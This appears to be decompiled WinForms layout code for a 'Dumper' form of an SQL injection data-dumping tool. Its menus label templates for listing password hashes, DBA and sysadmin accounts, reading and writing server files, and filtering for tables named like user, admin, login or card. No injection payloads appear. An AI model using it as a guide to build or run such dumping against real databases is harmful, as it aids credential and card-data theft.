		this.splData.SplitterWidth = 5;
		this.splData.TabIndex = 19;
		this.ctmTemplatesPostgreSQL.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.ctmTemplatesPostgreSQL.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.mnuPostgreSQL_ListUsers,
			this.mnuPostgreSQL_Passwords,
			this.mnuPostgreSQL_Join
		});
		this.ctmTemplatesPostgreSQL.Name = "mnuListView";
		this.ctmTemplatesPostgreSQL.ShowImageMargin = false;
		this.ctmTemplatesPostgreSQL.Size = new global::System.Drawing.Size(228, 94);
		this.mnuPostgreSQL_ListUsers.Name = "mnuPostgreSQL_ListUsers";
		this.mnuPostgreSQL_ListUsers.Size = new global::System.Drawing.Size(227, 30);
		this.mnuPostgreSQL_ListUsers.Text = "List Users";
		this.mnuPostgreSQL_Passwords.Name = "mnuPostgreSQL_Passwords";
		this.mnuPostgreSQL_Passwords.Size = new global::System.Drawing.Size(227, 30);
		this.mnuPostgreSQL_Passwords.Text = "List Password Hashes";
		this.mnuPostgreSQL_Join.Name = "mnuPostgreSQL_Join";
		this.mnuPostgreSQL_Join.Size = new global::System.Drawing.Size(227, 30);
		this.mnuPostgreSQL_Join.Text = "JOIN Example";
		this.ctmTemplatesOracle.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.ctmTemplatesOracle.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.mnuOracleListUsers,
			this.mnuOracleHashes,
			this.mnuOracleJoin,
			this.ToolStripSeparator24,
			this.mnuOracleHelp
		});
		this.ctmTemplatesOracle.Name = "mnuListView";
		this.ctmTemplatesOracle.ShowImageMargin = false;
		this.ctmTemplatesOracle.Size = new global::System.Drawing.Size(228, 130);
		this.mnuOracleListUsers.Name = "mnuOracleListUsers";
		this.mnuOracleListUsers.Size = new global::System.Drawing.Size(227, 30);
		this.mnuOracleListUsers.Text = "List Users";
		this.mnuOracleHashes.Name = "mnuOracleHashes";
		this.mnuOracleHashes.Size = new global::System.Drawing.Size(227, 30);
		this.mnuOracleHashes.Text = "List Password Hashes";
		this.mnuOracleJoin.Name = "mnuOracleJoin";
		this.mnuOracleJoin.Size = new global::System.Drawing.Size(227, 30);
		this.mnuOracleJoin.Text = "JOIN Example";
		this.mnuOracleJoin.Visible = false;
		this.ToolStripSeparator24.Name = "ToolStripSeparator24";
		this.ToolStripSeparator24.Size = new global::System.Drawing.Size(224, 6);
		this.mnuOracleHelp.Name = "mnuOracleHelp";
		this.mnuOracleHelp.Size = new global::System.Drawing.Size(227, 30);
		this.mnuOracleHelp.Text = "Help";
		this.ctmTemplatesMSSQL.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.ctmTemplatesMSSQL.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.mnuSqlLogins,
			this.mnuSqlIsAdmin,
			this.mnuSQLJoin,
			this.ToolStripMenuItem1,
			this.mnuSQLHelp
		});
		this.ctmTemplatesMSSQL.Name = "mnuListView";
		this.ctmTemplatesMSSQL.ShowImageMargin = false;
		this.ctmTemplatesMSSQL.Size = new global::System.Drawing.Size(223, 130);
		this.mnuSqlLogins.Name = "mnuSqlLogins";
		this.mnuSqlLogins.Size = new global::System.Drawing.Size(222, 30);
		this.mnuSqlLogins.Text = "List Users";
		this.mnuSqlIsAdmin.Name = "mnuSqlIsAdmin";
		this.mnuSqlIsAdmin.Size = new global::System.Drawing.Size(222, 30);
		this.mnuSqlIsAdmin.Text = "Account Is sysadmin";
		this.mnuSQLJoin.Name = "mnuSQLJoin";
		this.mnuSQLJoin.Size = new global::System.Drawing.Size(222, 30);
		this.mnuSQLJoin.Text = "JOIN Example";
		this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
		this.ToolStripMenuItem1.Size = new global::System.Drawing.Size(219, 6);
		this.mnuSQLHelp.Name = "mnuSQLHelp";
		this.mnuSQLHelp.Size = new global::System.Drawing.Size(222, 30);
		this.mnuSQLHelp.Text = "Help";
		this.bckWorker.WorkerReportsProgress = true;
		this.bckWorker.WorkerSupportsCancellation = true;
		this.tlpUrl.AutoPopDelay = 5000;
		this.tlpUrl.InitialDelay = 500;
		this.tlpUrl.ReshowDelay = 100;
		this.tlpUrl.ShowAlways = true;
		this.tlpUrl.ToolTipIcon = global::System.Windows.Forms.ToolTipIcon.Info;
		this.tlpUrl.ToolTipTitle = "Info";
		this.ctmTemplatesFilters.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.ctmTemplatesFilters.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.mnuFilters1,
			this.mnuFilters2,
			this.mnuFilters5,
			this.mnuFilters6,
			this.mnuFilters7,
			this.mnuFilters8,
			this.mnuFilters9,
			this.mnuFilters10,
			this.mnuFilters3,
			this.ToolStripMenuItem12
		});
		this.ctmTemplatesFilters.Name = "mnuListView";
		this.ctmTemplatesFilters.ShowImageMargin = false;
		this.ctmTemplatesFilters.Size = new global::System.Drawing.Size(294, 304);
		this.mnuFilters1.Name = "mnuFilters1";
		this.mnuFilters1.Size = new global::System.Drawing.Size(293, 30);
		this.mnuFilters1.Text = "WHERE current DataBase()";
		this.mnuFilters2.Name = "mnuFilters2";
		this.mnuFilters2.Size = new global::System.Drawing.Size(293, 30);
		this.mnuFilters2.Text = "LIKE table name %user%";
		this.mnuFilters5.Name = "mnuFilters5";
		this.mnuFilters5.Size = new global::System.Drawing.Size(293, 30);
		this.mnuFilters5.Text = "LIKE table name %admin%";
		this.mnuFilters6.Name = "mnuFilters6";
		this.mnuFilters6.Size = new global::System.Drawing.Size(293, 30);
		this.mnuFilters6.Text = "LIKE table name %login%";
		this.mnuFilters7.Name = "mnuFilters7";
		this.mnuFilters7.Size = new global::System.Drawing.Size(293, 30);
		this.mnuFilters7.Text = "LIKE table name %customer%";
		this.mnuFilters8.Name = "mnuFilters8";
		this.mnuFilters8.Size = new global::System.Drawing.Size(293, 30);
		this.mnuFilters8.Text = "LIKE table name %sale%";
		this.mnuFilters9.Name = "mnuFilters9";
		this.mnuFilters9.Size = new global::System.Drawing.Size(293, 30);
		this.mnuFilters9.Text = "LIKE table name %mail%";
		this.mnuFilters10.Name = "mnuFilters10";
		this.mnuFilters10.Size = new global::System.Drawing.Size(293, 30);
		this.mnuFilters10.Text = "LIKE table name %card%";
		this.mnuFilters3.Name = "mnuFilters3";
		this.mnuFilters3.Size = new global::System.Drawing.Size(293, 30);
		this.mnuFilters3.Text = "WHERE NOT column IS NULL";
		this.ctmTemplatesMySQL.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.ctmTemplatesMySQL.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.mnuUsers,
			this.mnuPrivileges,
			this.mnuListDBA,
			this.mnuHostIP,
			this.mnuExtraMySQLStuffs2,
			this.mnuLoadFile,
			this.mnuIntoOutfile,
			this.mnuIntoDumpfile,
			this.mnuExtraMySQLStuffs,
			this.mnuCheckUser,
			this.mnuCheckPizza,
			this.mnuJOIN,
			this.mnuLENGTH,
			this.mnuLimitXY,
			this.ToolStripSeparator34,
			this.mnuMySQLHelp
		});
		this.ctmTemplatesMySQL.Name = "mnuListView";
		this.ctmTemplatesMySQL.ShowImageMargin = false;
		this.ctmTemplatesMySQL.ShowItemToolTips = false;
		this.ctmTemplatesMySQL.Size = new global::System.Drawing.Size(395, 460);
		this.mnuUsers.Name = "mnuUsers";
		this.mnuUsers.Size = new global::System.Drawing.Size(394, 30);
		this.mnuUsers.Text = "MySQL Users Passwords Hashes";
		this.mnuPrivileges.Name = "mnuPrivileges";
		this.mnuPrivileges.Size = new global::System.Drawing.Size(394, 30);
		this.mnuPrivileges.Text = "List Privileges";
		this.mnuListDBA.Name = "mnuListDBA";
		this.mnuListDBA.Size = new global::System.Drawing.Size(394, 30);
		this.mnuListDBA.Text = "List DBA Accounts";
		this.mnuHostIP.Name = "mnuHostIP";
		this.mnuHostIP.Size = new global::System.Drawing.Size(394, 30);
		this.mnuHostIP.Text = "Hostname, Data Dir";
		this.mnuExtraMySQLStuffs2.Name = "mnuExtraMySQLStuffs2";
		this.mnuExtraMySQLStuffs2.Size = new global::System.Drawing.Size(394, 30);
		this.mnuExtraMySQLStuffs2.Text = "User(), DataBase(), Version()";
		this.mnuLoadFile.Name = "mnuLoadFile";
		this.mnuLoadFile.Size = new global::System.Drawing.Size(394, 30);
		this.mnuLoadFile.Text = "Load_File()";
		this.mnuIntoOutfile.Name = "mnuIntoOutfile";
		this.mnuIntoOutfile.Size = new global::System.Drawing.Size(394, 30);
		this.mnuIntoOutfile.Text = "Into Outfile()";
		this.mnuIntoDumpfile.Name = "mnuIntoDumpfile";
		this.mnuIntoDumpfile.Size = new global::System.Drawing.Size(394, 30);
		this.mnuIntoDumpfile.Text = "Into Dumpfile()";
		this.mnuExtraMySQLStuffs.Name = "mnuExtraMySQLStuffs";
		this.mnuExtraMySQLStuffs.Size = new global::System.Drawing.Size(394, 30);
		this.mnuExtraMySQLStuffs.Text = "Md5(), Sha1(), Password()";
		this.mnuCheckUser.Name = "mnuCheckUser";
		this.mnuCheckUser.Size = new global::System.Drawing.Size(394, 30);
		this.mnuCheckUser.Text = "DataBase, Table, Column Contains %user%";
		this.mnuCheckPizza.Name = "mnuCheckPizza";
		this.mnuCheckPizza.Size = new global::System.Drawing.Size(394, 30);
		this.mnuCheckPizza.Text = "DataBase, Table, Column Contains Pizza";
		this.mnuJOIN.Name = "mnuJOIN";
		this.mnuJOIN.Size = new global::System.Drawing.Size(394, 30);
		this.mnuJOIN.Text = "JOIN Example";
		this.mnuLENGTH.Name = "mnuLENGTH";
		this.mnuLENGTH.Size = new global::System.Drawing.Size(394, 30);
		this.mnuLENGTH.Text = "LENGTH((DATABASE())";
		this.mnuLimitXY.Name = "mnuLimitXY";
		this.mnuLimitXY.Size = new global::System.Drawing.Size(394, 30);
		this.mnuLimitXY.Text = "Limit [x],[y]";
		this.ToolStripSeparator34.Name = "ToolStripSeparator34";
		this.ToolStripSeparator34.Size = new global::System.Drawing.Size(391, 6);
		this.mnuMySQLHelp.Name = "mnuMySQLHelp";
		this.mnuMySQLHelp.Size = new global::System.Drawing.Size(394, 30);
		this.mnuMySQLHelp.Text = "&Help";
		this.tlsMenu.GripStyle = global::System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tlsMenu.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.tlsMenu.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.btnPasteURL,
			this.toolStripSeparator18,
			this.cmbSqlType,
			this.ToolStripSeparator2
		});
		this.tlsMenu.Location = new global::System.Drawing.Point(0, 0);
		this.tlsMenu.Name = "tlsMenu";
		this.tlsMenu.Padding = new global::System.Windows.Forms.Padding(0, 0, 4, 0);
		this.tlsMenu.RenderMode = global::System.Windows.Forms.ToolStripRenderMode.System;
		this.tlsMenu.ShowItemToolTips = false;
		this.tlsMenu.Size = new global::System.Drawing.Size(1762, 33);
		this.tlsMenu.Stretch = true;
		this.tlsMenu.TabIndex = 20;
		this.tlsMenu.Text = "ToolStrip2";
		this.btnPasteURL.DisplayStyle = global::System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnPasteURL.Image = global::ns0.Class6.URLInputBox_16x_24;
		this.btnPasteURL.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnPasteURL.Name = "btnPasteURL";
		this.btnPasteURL.Size = new global::System.Drawing.Size(28, 30);
		this.btnPasteURL.Text = "&Paste URL";
		this.toolStripSeparator18.Name = "toolStripSeparator18";
		this.toolStripSeparator18.Size = new global::System.Drawing.Size(6, 33);
		this.cmbSqlType.Alignment = global::System.Windows.Forms.ToolStripItemAlignment.Right;
		this.cmbSqlType.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbSqlType.Name = "cmbSqlType";
		this.cmbSqlType.Size = new global::System.Drawing.Size(160, 33);
		this.ToolStripSeparator2.Alignment = global::System.Windows.Forms.ToolStripItemAlignment.Right;
		this.ToolStripSeparator2.Name = "ToolStripSeparator2";
		this.ToolStripSeparator2.Size = new global::System.Drawing.Size(6, 33);
		base.AutoScaleDimensions = new global::System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new global::System.Drawing.Size(1762, 1452);
		base.ControlBox = false;
		base.Controls.Add(this.splData);
		base.Controls.Add(this.tsGetInfo);
		base.Controls.Add(this.tlsMenu);
		base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
		base.Name = "Dumper";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		this.Text = "Dumper";
		this.tsGetInfo.ResumeLayout(false);
		this.tsGetInfo.PerformLayout();
		this.tbcMain.ResumeLayout(false);
		this.tpSchema.ResumeLayout(false);
		this.tpSchema.PerformLayout();
		this.splSchema.Panel1.ResumeLayout(false);
		this.splSchema.Panel2.ResumeLayout(false);
		this.splSchema.Panel2.PerformLayout();
		((global::System.ComponentModel.ISupportInitialize)this.splSchema).EndInit();
		this.splSchema.ResumeLayout(false);
		this.mnuTree.ResumeLayout(false);
		this.splWhere.Panel1.ResumeLayout(false);
		this.splWhere.Panel2.ResumeLayout(false);
		((global::System.ComponentModel.ISupportInitialize)this.splWhere).EndInit();
		this.splWhere.ResumeLayout(false);
		this.grbWhere.ResumeLayout(false);
		this.grbWhere.PerformLayout();
		this.grbOrderBy.ResumeLayout(false);
		this.grbOrderBy.PerformLayout();
		this.tsConvert1.ResumeLayout(false);
		this.tsConvert1.PerformLayout();
		this.ctmConvert.ResumeLayout(false);
		this.ctmSchema.ResumeLayout(false);
		this.tsSchema.ResumeLayout(false);
		this.tsSchema.PerformLayout();
		this.tpQuery.ResumeLayout(false);
		this.tpQuery.PerformLayout();
		this.splQuery.Panel1.ResumeLayout(false);
		this.splQuery.Panel1.PerformLayout();
		this.splQuery.Panel2.ResumeLayout(false);
		this.splQuery.Panel2.PerformLayout();
		((global::System.ComponentModel.ISupportInitialize)this.splQuery).EndInit();
		this.splQuery.ResumeLayout(false);
		this.tsCustomDump.ResumeLayout(false);
		this.tsCustomDump.PerformLayout();
		this.tpMyLoadFile.ResumeLayout(false);
		this.grbWriteFile.ResumeLayout(false);
		this.grbWriteFile.PerformLayout();
		this.tsMySQLWriteFile.ResumeLayout(false);
		this.tsMySQLWriteFile.PerformLayout();
		this.grbLoadFile.ResumeLayout(false);
		this.grbLoadFile.PerformLayout();
		this.tsMySQLReadFile.ResumeLayout(false);
		this.tsMySQLReadFile.PerformLayout();
		this.tpSearch.ResumeLayout(false);
		this.tpSearch.PerformLayout();
		this.tsSearchColumn.ResumeLayout(false);
		this.tsSearchColumn.PerformLayout();
		((global::System.ComponentModel.ISupportInitialize)this.numSleepMultiThread).EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.numMaxRetryMultiThread).EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.numSleep).EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.numMaxRetry).EndInit();
		this.pnlSetupDump.ResumeLayout(false);
		this.pnlSetupDump2.ResumeLayout(false);
		this.pnlSetupDump2.PerformLayout();
		this.tsNewDumpBtn.ResumeLayout(false);
		this.tsNewDumpBtn.PerformLayout();
		this.grbInjectionPoint.ResumeLayout(false);
		this.grbInjectionPoint.PerformLayout();
		this.grbLogin.ResumeLayout(false);
		this.grbLogin.PerformLayout();
		this.grbDumpSetup2.ResumeLayout(false);
		this.grbMySQLSplitRows.ResumeLayout(false);
		((global::System.ComponentModel.ISupportInitialize)this.numMySQLSplitRowsLenght).EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.numMySQLSplitRows).EndInit();
		this.grbDumpSetup.ResumeLayout(false);
		((global::System.ComponentModel.ISupportInitialize)this.numLimitX).EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.numMaxRetryColumn).EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.numFieldByField).EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.numLimitMax).EndInit();
		this.grbOracleCollactions.ResumeLayout(false);
		this.grbMSSQLCollactions.ResumeLayout(false);
		this.grbMySQLCollactions.ResumeLayout(false);
		this.grbSetupCon.ResumeLayout(false);
		((global::System.ComponentModel.ISupportInitialize)this.numThreads).EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.numTimeOut).EndInit();
		this.splData.Panel1.ResumeLayout(false);
		((global::System.ComponentModel.ISupportInitialize)this.splData).EndInit();
		this.splData.ResumeLayout(false);
		this.ctmTemplatesPostgreSQL.ResumeLayout(false);
		this.ctmTemplatesOracle.ResumeLayout(false);
		this.ctmTemplatesMSSQL.ResumeLayout(false);
		this.ctmTemplatesFilters.ResumeLayout(false);
		this.ctmTemplatesMySQL.ResumeLayout(false);
		this.tlsMenu.ResumeLayout(false);
		this.tlsMenu.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	// Token: 0x04000289 RID: 649
	private global::System.ComponentModel.IContainer icontainer_0;
}
